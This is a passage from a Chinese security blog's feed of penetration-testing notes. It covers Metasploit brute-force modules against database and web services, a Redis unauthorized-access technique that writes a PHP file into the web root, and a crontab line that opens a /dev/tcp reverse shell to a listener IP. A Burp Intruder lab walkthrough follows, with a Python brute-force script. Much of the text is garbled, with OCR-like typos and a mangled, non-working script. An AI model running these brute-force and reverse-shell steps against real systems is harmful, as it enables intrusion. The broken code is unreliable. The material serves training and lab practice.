Directory成员</li></ol></li><li><strong>Docker 快速搭建Samba环境:</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#拉取镜像</span></span><br><span class="line">docker pull dpersoti/ samba</span><br><span class="line"></span><br><span class="line">docker run -it \</span><br><span class="line">--name brute_samba \     <span class="comment">#为新的容器命一个名，方便启动、停止、删除等操作，毕竟一长串字符不好输入</span></span><br><span class="line">-p 139:139 \   <span class="comment">#将主机的139端口映射到samba_docker这个容器的139端口上</span></span><br><span class="line">-p 445:445 \   <span class="comment">#将主机的445端口映射到samba_docker这个容器的445端口上</span></span><br><span class="line">-v/Users/sec/Downloads:/home/shares/shareA\   <span class="comment">#将主机上的共享目录向容器进行映射</span></span><br><span class="line">-d dperson/ samba l<span class="comment">#以dperson/ samba这个dockers镜像为模板，建立容器</span></span><br><span class="line">-w <span class="string">&quot;WORKGROUP&quot;</span> \   <span class="comment">#从这里开始是dperson/samba 的参数，上面是docker run的参数。这里指定了工作组</span></span><br><span class="line">-u <span class="string">&quot;admin ; 123456789&quot;</span>\   <span class="comment">#为samba服务设置账户和密码</span></span><br><span class="line">-s <span class="string">&quot;shareA; / home/shares/shareA; yes;no; no ; admin ;admin ; admin&quot;</span>   <span class="comment">#共享文件夹的名称;共享在samba容器中的路径;共享名称对所有工作组用户可见;不是只读(也就是说可写;不允许guest用户;指定共享的所有权用户;指定共享的超级用户;指定具有写权限的用户;</span></span><br></pre></td></tr></table></figure><h3 id="爆破-1433-MSSQL"><a href="#爆破-1433-MSSQL" class="headerlink" title="爆破 1433 MSSQL"></a>爆破 1433 MSSQL</h3><p>MSSQL是指微软<strong>的SQLServer数据库</strong>，默认端口为1433，默认最高权限用户为 sa，<strong>拿到 sa 用户权限的话，基本可以顺利提权拿到系统权限。</strong></p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/mssql/mssql_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line"><span class="built_in">set</span> USERNAME sa</span><br><span class="line"><span class="built_in">set</span> PASS_FILE /root/password.txt</span><br><span class="line"><span class="built_in">set</span> THREADS 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-1521-Oracle"><a href="#爆破-1521-Oracle" class="headerlink" title="爆破 1521 Oracle"></a>爆破 1521 Oracle</h3><p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系<strong>数据库管理系统</strong>。<strong>默认端口为1521端口</strong>，和其他数据库不同的是，爆破前得先爆破对应的SID，不过<strong>SID很多都是默认的</strong>，可以使用MSF来进行爆破。</p><ul><li><strong>Metasploit 爆破SID</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/oracle/sid_brute</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li><strong>Metasploit爆破Oracle</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/oracle/oracle_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line"><span class="built_in">set</span> RPORTS 1521</span><br><span class="line"><span class="built_in">set</span> SID xXX</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-3360-MySQl"><a href="#爆破-3360-MySQl" class="headerlink" title="爆破 3360 MySQl"></a>爆破 3360 MySQl</h3><p>MySQL是一个关系型<strong>数据库管理系统</strong>，默认端口为3306<br>爆破前检测是否<strong>开启</strong>数据库外连，不要做无意义的爆破，可以手动写Python 脚本来批量验证。</p><ul><li>同一个IP 在短时间内产生太多(超过mysql数据库max_connection_errors的最大值)中断的数据库连接而导致的阻塞</li><li>此时哪怕输入正确的密码也已经无济于事了，解决方法只能重启数据库:</li></ul><h3 id="爆破-3389-RDP"><a href="#爆破-3389-RDP" class="headerlink" title="爆破 3389 RDP"></a>爆破 3389 RDP</h3><p>远程桌面协议RDP(Remote Display Protocol ）是Windows的远程桌面所使用的协议。通过提供一个有效的用户账号密码即可登陆到Windows计算机，默认端口为 3389<br>暴力破解服务器远程桌面账户密码，最好做一下前期的信息收集，猜测下目标的用户名，一般Windows服务器陌<em>默认账户为administrator</em> 此外如果对方服务器开启了SMB 445端口的话尽量优先爆破SMB，<strong>因为RDP协议比较脆弱,经不起高速的爆破</strong>。</p><h3 id="爆破-5432-PostgreSQL"><a href="#爆破-5432-PostgreSQL" class="headerlink" title="爆破 5432 PostgreSQL"></a>爆破 5432 PostgreSQL</h3><p>PostgreSQL 是一种<strong>对象-关系型数据库管理系统</strong>，默认端口为 5432 可以直接使用<strong>超级弱口令工具爆破</strong>也可以使用<strong>Metasploit</strong>来进行爆破</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/ postgres/postgres_login</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line">RPORTS 5432</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-6379-Redis"><a href="#爆破-6379-Redis" class="headerlink" title="爆破 6379 Redis"></a>爆破 6379 Redis</h3><ul><li>redis 默认没有密码<br>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value 数据库，并提供多种语言的API。默认端口为6379<br>可以直接使用超级弱口令工具爆破也可以使用Metasploit:</li><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary / scanner/ redis / redis_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.3</span><br><span class="line"><span class="built_in">set</span> pass_file /root/pass.txt</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>MSF的爆破速度，大概1秒种2个字典<br>编辑配置文件，设置添加密码参数如下:<br><code>requirepass ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815</code></p><blockquote><p>redis因查询效率高，auth这种命令每秒能处理10w次以上，简单的redis的密码极容易为攻击者暴破。requirepass至少长度20位以上</p></blockquote><p>重启redis服务，验证查看:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#带密码的连接格式</span></span><br><span class="line">redis-cli -h 10.211.55.4 -p 6379 -a XXXXXXXX</span><br></pre></td></tr></table></figure><ul><li><strong>还有一种不启动修改 redis 密码</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询当前密码</span></span><br><span class="line">127.0.0.1:6379&gt; config get requirepass</span><br><span class="line">1) <span class="string">&quot;requirepass&quot;</span></span><br><span class="line">2)<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置认证密码</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> requirepass ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f2</span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看密码提示没有认证的登录</span></span><br><span class="line">127.0.0.1:6379&gt;config get requirepass</span><br><span class="line">(error)NOAUTH Authentication required.</span><br><span class="line"></span><br><span class="line"><span class="comment">#auth登录下</span></span><br><span class="line">127.0.0.1:6379&gt; auth ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815</span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line"><span class="comment">#再次查看密码</span></span><br><span class="line">127.0.0.1:6379 &gt; config get requirepass</span><br><span class="line">1) <span class="string">&quot; requirepass&quot;</span></span><br><span class="line">2) <span class="string">&quot;ed4c39b015b0e46f074dbfd0a9a4ab278f63340a6d640999f25c68a932fef815&quot;</span></span><br></pre></td></tr></table></figure><p>重启后失效</p><h3 id="爆破-8080-Tomcat"><a href="#爆破-8080-Tomcat" class="headerlink" title="爆破 8080 Tomcat"></a>爆破 8080 Tomcat</h3><p>Tomcat是由 Apache 软件基金会属下Jakarta项目开发的<strong>Servlet容器</strong>，默认端口为8080<br>可以使用Burp的Basic认证爆破也可以直接使用MSF的模块来进行爆破。<strong>Tomcat令是用户名<br>在&#x2F;conf&#x2F;tomcat-users.xml自定义配置的，容易出现弱口令</strong>，<strong>Tomcat口令泄露的话很容易被getshell所有需要加固口令</strong>。</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class="line"><span class="built_in">set</span> RHosTsf 10.211.55.3</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="爆破-27017-MongoDb"><a href="#爆破-27017-MongoDb" class="headerlink" title="爆破 27017 MongoDb"></a>爆破 27017 MongoDb</h3><p>MongoDB是一个基于<strong>分布式文件存储的数据库</strong>，当配置成无验证时，存在未授权访问。默认端口为 <strong>27017</strong> 可以直接使用超级弱口令工具爆破也可以使用Metasploit:</p><ul><li><strong>Metasploit</strong></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary /scanner / mongodb/mongodb_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.211.55.6</span><br><span class="line"><span class="built_in">set</span> RPORTS 27017</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p>未授权访问，顾名思义<strong>不进行请求授权的情况下对需要权限的功能进行访问执行</strong>。通常是由于<strong>认证页面存在缺陷</strong>，无认证，安全配置不当导致。<strong>常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能</strong>越权漏洞。<br>未授权访问通常是会<strong>泄露用户信息，系统信息</strong>。某些服务和系统中，未授权访问还可以<strong>执行系统命令，操作系统文件，导致系统的整体安全遭到破坏</strong>。</p><ul><li>常见未授权访问漏洞总结 <a href="http://xz.aliyun.com/t/6103#toc-13">xz.aliyun.com&#x2F;t&#x2F;6103#toc-13</a></li></ul><h3 id="Redis-未授权访问"><a href="#Redis-未授权访问" class="headerlink" title="Redis 未授权访问"></a>Redis 未授权访问</h3><p>Redis是一个开源的使用ANSIC语言编写、支持网络、可基于内存亦可持久化的<strong>日志型、Key-Value数据库</strong>，并提供多种语言的API。<br>Redi 因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可<strong>导致敏感信息泄露</strong>，也可以恶意执行操作。</p><h4 id="Redis环境搭建"><a href="#Redis环境搭建" class="headerlink" title="Redis环境搭建"></a>Redis环境搭建</h4><ul><li>Windows安装<br>下载地址: <a href="https://github.com/microsoftarchive/redis/releases">https://github.com/microsoftarchive/redis/releases</a></li></ul><p>打开一个cmd窗口使用命令切换到Redis运行:<br><code>redis-server.exe redis.windows.conf</code></p><p>后面的那个redis.windows.conf可以省略，如果省略，会启用默认的。输入之后，会显示如下界面:<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h553ksapn0j30qj0c9dkh.jpg" alt="image.png"></p><p>这时候另启一个CMD窗口，原来的不要关闭，不然就无法访问服务端了。</p><p><strong>一些基本的交互命令:</strong><br><strong>切换到Redis目录下运行:</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h127.0.0.1 -p 6379</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看Redis的相关信息</span></span><br><span class="line">127.0.0.1:6379&gt;info</span><br><span class="line"></span><br><span class="line"><span class="comment">#SET 设置键值对测试</span></span><br><span class="line">127.0.0.1:6379&gt;SET X<span class="string">&quot;Tomorrow is a another day&quot;</span></span><br><span class="line">oK</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; GET X</span><br><span class="line"><span class="string">&quot;Tomorrow is a another day&quot;</span></span><br></pre></td></tr></table></figure><ul><li><strong>Linux编译安装</strong><br>下载地址:<a href="https://redis.io/download">https://redis.io/download</a></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载Redis</span></span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.5.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#解压</span></span><br><span class="line">tar zxvf redis-5.0.5..tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#到src目录下</span></span><br><span class="line"><span class="built_in">cd</span> redis-5.0.5/src</span><br><span class="line"></span><br><span class="line"><span class="comment">#编译</span></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Redis服务:</span></span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure><blockquote><p>注意这种方式启动Redis使用的是默认配置。也可以通过启动参数告诉Redis使用指定配置文件使用下面命令启动。.&#x2F;src&#x2F;redis-server redis.conf其中 <strong>redis.conf 是一个默认的配置文件</strong>。我们可以<strong>根据需要使用自己的配置文件</strong>。</p></blockquote><p>启动Redis服务进程后，就可以<strong>使用测试客户端程序redis-cli和Redis服务交互了</strong>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali-linux:~/ redis-5.0.5/src<span class="comment"># ./ redis-cli -h 127.0.0.1 -p 6379</span></span><br><span class="line">127.0.0. 1:6379&gt;SET y <span class="string">&quot;Linux Redis is Running&quot;</span></span><br><span class="line">0K</span><br><span class="line">127.0.0.1:6379&gt; GET y</span><br><span class="line"><span class="string">&quot;Linux Redis is Running&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h5517wgupsj30q507o436.jpg" alt="image"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#操作目录</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/</span><br><span class="line">OK.</span><br><span class="line"></span><br><span class="line"><span class="comment">#操作文件</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置数据</span></span><br><span class="line">10.211.55.4:6379&gt; <span class="built_in">set</span> x <span class="string">&quot;&lt;?php phpinfo( ) ; ?&gt;&quot;</span></span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line"><span class="comment">#写入数据</span></span><br><span class="line">10.211.55.4:6379&gt;save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h3 id="未授权访问弹-shell"><a href="#未授权访问弹-shell" class="headerlink" title="未授权访问弹 shell"></a>未授权访问弹 shell</h3><ul><li><strong>crontab 定时任务</strong><br>Python 实现T00ls自动签到脚本（邮件+钉钉通知)<br>Linux下使用原生的crontab命令实现定时任务了∶</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看定时任务</span></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line"><span class="comment">#编辑定时任务</span></span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>编辑定时任务，一行一个任务:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分时日月星期要运行的命令</span></span><br><span class="line">30 9 * * * /usr/bin/python3 /root/code/t00ls/TuBi.py&gt;&amp;1</span><br></pre></td></tr></table></figure><p>表示每天9:30自动运行下面的命令:<br><code>/usr/bin/python3 /root/ code/t00ls/TuBi.py</code></p><p>这样看起来是不是很简单呢，如果语法没有问题的话，会得到如下提示:<br><code>crontab: installing new crontab</code></p><p>这表示新建定时任务成功，后面就可以躺着赚去每天的2个TuBi了。</p><h3 id="crontab实例"><a href="#crontab实例" class="headerlink" title="crontab实例"></a>crontab实例</h3><ul><li><strong>实例1</strong>∶每1分钟执行一次myCommand<br><code>* * * * * myCommand</code></li><li><strong>实例2</strong>:每小时的第3和第15分钟执行<br><code>315 * * * * myCommand</code></li><li><strong>实例3</strong>:在上午8点到11点的第3和第15分钟执行<br><code>3,15 8-11 * * * myCommand</code></li><li><strong>实例4</strong>∶每隔两天的上午8点到11点的第3和第15分钟执行<br><code>3,15 8-11 */2 * * myCommand</code></li><li><strong>实例5</strong>:每周一上午8点到11点的第3和第15分钟执行<br><code>3,15 8-11 * * 1 myCommand</code></li><li><strong>实例6</strong>:每晚的21:30重启smb<br><code>30 21***/etc/init.d/smb restart</code></li><li><strong>实例7</strong>:每月1、10、22日的4:45重启smb<br><code>45 4 1,10,22 * * /etc/init.d/smb restart</code></li><li><strong>实例8</strong>:每周六、周日的1: 10重启smb<br><code>101 * * 6,0 /etc/init.d/ smb restart</code></li><li><strong>实例9</strong>:每天18:00至23 :00之间每隔30分钟重启smb<br><code>0,3018-23 * * * /etc /init.d /smb restart</code></li><li><strong>实例10</strong>:每星期六的晚上23 : 00重启smb<br><code>0 23 * * 6 /etc/init.d/smb restart</code></li><li><strong>实例11</strong>∶每一小时重启smb<br><code>* * /1 * * * / etc/init.d/smb restart</code></li><li><strong>实例12</strong>:晚上11点到早上7点之间，每隔一小时重启smb<br><code>0 23-7 * * * /etc/init.d/smb restart</code></li><li><strong>关于letc&#x2F;crontab 及 &#x2F;varlspool&#x2F;cron&#x2F;crontabs&#x2F;$USER中定义的定时任务</strong><br>&#x2F;etc&#x2F;crontab只有 root用户可以使用，使用时需root权限，而且必须指定运行用户，才会执行;<br><code>* * * * * root myCommand</code><br>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;$USER所有用户都可以使用，可以使用crontab -u username -e 命令来直接编辑这个文件:<br><code>* * * * * myCommand</code></li></ul><p>Kali的定时任务为&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;$USER shell下有点问题，Ubuntu 16.10已将先前默认的bashshell 更换为了dashshell。Debian和Ubuntu中，&#x2F;bin&#x2F;sh默认已经指向dash，这是一个不同于bash的shell，它主要是为了执行脚本而出现，而不是交互，它速度更快，但功能相比bash要少很多，语法严格遵守POSIX标准。因为缺少了&#x2F;bin&#x2F;ls -bash的交互特性，所以kali中弹不回shelI可以得到很好的解释了。<br><code>ln -fs /bin/bash /bin/sh</code></p><h3 id="nc-命令教程"><a href="#nc-命令教程" class="headerlink" title="nc 命令教程"></a>nc 命令教程</h3><ul><li>nc 命令教程<br>nc被誉为网络安全界的瑞士军刀，<strong>一个简单而有用的工具</strong>，<strong>通过使用TCP或UDP协议的网络连接去读写数据</strong>。</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /ar/spool/ cron/ crontabs/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n* * * * */bin/bash -i &gt;&amp; / dev/tcp/10.211.55.2/2333 0&gt;&amp;1 \n&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><h2 id="Web认证爆破"><a href="#Web认证爆破" class="headerlink" title="Web认证爆破"></a>Web认证爆破</h2><ul><li>详细看密码爆破</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 认证技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码爆破</title>
      <link href="/posts/undefined/sec3/"/>
      <url>/posts/undefined/sec3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>这也是认证技术的一部分<br>  因为内容原因特地分出来</p></blockquote><h1 id="BurpSuite-lntruder爆破模块详解"><a href="#BurpSuite-lntruder爆破模块详解" class="headerlink" title="BurpSuite lntruder爆破模块详解"></a>BurpSuite lntruder爆破模块详解</h1><p><strong>本项目的优势</strong>：</p><ol><li><strong>Docker 一键部署</strong>很方便，可以灵活的导入到 CTFd 中</li><li><strong>前面是解题提示和思路，后面带有详细的解题步骤</strong> </li><li>题目更侧重于教学，注重对选手解题的引导，而不是一味地刁难选手</li><li>详细的解题步骤转自<a href="https://www.sqlsec.com/2020/10/upload.html">国光的博客</a></li></ol><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p><strong>DockerHub 项目地址</strong>：<a href="https://hub.docker.com/r/sqlsec/ggctf-upload">https://hub.docker.com/r/sqlsec/ggctf-upload</a><br><strong>Github 项目地址</strong>：<a href="https://github.com/sqlsec/upload-labs-docker">https://github.com/sqlsec/upload-labs-docker</a></p><ul><li><strong>推荐使用 Ubuntu 哦</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入项目文件夹</span></span><br><span class="line"><span class="built_in">cd</span> upload-labs-docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一键部署运行</span></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>默认 13 个关卡运行的端口为 30001-30013 这 13 个端口上，如果要自定义端口信息的话，自行修改 docker-compose.yml 文件即可。</p><blockquote><p>一共 13 个 Docker 容器，可能第一次部署需要一定的时间，有点硬伤， 耐心等待一下即可</p></blockquote><p><a href="https://image.3001.net/images/20201025/16035979507409.png"><img src="https://image.3001.net/images/20201025/16035979507409.png" alt="img"></a></p><h2 id="Web爆破靶场实战"><a href="#Web爆破靶场实战" class="headerlink" title="Web爆破靶场实战"></a>Web爆破靶场实战</h2><h3 id="1-简单的四位数字密码爆破"><a href="#1-简单的四位数字密码爆破" class="headerlink" title="1.简单的四位数字密码爆破"></a>1.简单的四位数字密码爆破</h3><p>用 BP 抓包发测试 <strong>Intruder</strong> 进行爆破，注意要<strong>设置密码格式</strong></p><h3 id="2-简单的弱口令密码爆破"><a href="#2-简单的弱口令密码爆破" class="headerlink" title="2.简单的弱口令密码爆破"></a>2.简单的弱口令密码爆破</h3><ul><li><strong>验证码复用</strong>漏洞<br>用 BP 抓包  输入字典进行爆破</li></ul><h3 id="3-带验证码的密码爆破？"><a href="#3-带验证码的密码爆破？" class="headerlink" title="3.带验证码的密码爆破？"></a>3.带验证码的密码爆破？</h3><p>抓包之后 <strong>不放包</strong> 验证码不会失效 就能一直爆破了</p><h3 id="4-Basic-爆破"><a href="#4-Basic-爆破" class="headerlink" title="4.Basic 爆破"></a>4.Basic 爆破</h3><p>将密码加密 base64 加密<br>BP <strong>迭代器</strong>，账号:密码  有效载荷选项 和 有效负荷处理</p><h3 id="5-前端加密爆破"><a href="#5-前端加密爆破" class="headerlink" title="5.前端加密爆破"></a>5.前端加密爆破</h3><ul><li>原理：把前端加密 md5 放进数据库<br>BP 有效负荷处理 添加HASH 的md5 加密 然后再攻击</li></ul><h3 id="6-泄露数据库撞库"><a href="#6-泄露数据库撞库" class="headerlink" title="6.泄露数据库撞库"></a>6.泄露数据库撞库</h3><ul><li>BP使用<br><strong>音叉攻击 Pichfork</strong>：是用户名与密码一一对应的进行爆破</li></ul><h3 id="7-泄露数据库撞库-2"><a href="#7-泄露数据库撞库-2" class="headerlink" title="7.泄露数据库撞库-2"></a>7.泄露数据库撞库-2</h3><ul><li>BP使用<br><strong>音叉攻击 Pichfork，paylode处理hash md5加密</strong></li></ul><h3 id="8-返回包提取爆破"><a href="#8-返回包提取爆破" class="headerlink" title="8.返回包提取爆破"></a>8.返回包提取爆破</h3><p>正确错误<strong>返回密码长度都相同</strong>时， 在Options中选择<strong>Extract</strong> ，添加返回<strong>选中</strong></p><h3 id="9-简单的-token-验证"><a href="#9-简单的-token-验证" class="headerlink" title="9.简单的 token 验证"></a>9.简单的 token 验证</h3><ul><li>token 时间戳形式<br>时间戳 BP 不能写时间戳 需要手动写脚本<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    m=hashlib.md5()</span><br><span class="line">    m.update(<span class="built_in">str</span>.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url =<span class="string">&quot;http://10.20.24.244/&quot;</span> headers =</span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;10.20.24.244&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type1: &#x27;</span>application/x-ww-form-urlencoded<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;</span>User-Agent<span class="string">&#x27;:&#x27;</span>Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>;Win64;x64)AppleWebKit/<span class="number">537.36</span> (KHTML,like</span><br><span class="line">&#125;</span><br><span class="line">payloads=<span class="built_in">open</span>(<span class="string">&quot;pass,txt&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">    data =<span class="string">f&quot;username=admin&amp;password=<span class="subst">&#123;payload&amp;token=&#123;md5(<span class="built_in">str</span>(<span class="built_in">int</span>(time.tihe())))y<span class="string">&quot; </span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">    r = requests.post(url=url, headers=headers, data=data)</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">    if&#x27;flag&#123;&#x27;in r.text:</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="string">        print(f&quot;</span>\033[<span class="number">32</span>;1m[+] success &#123;data&#125;</span>\033[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\033[1;34m[*] attack<span 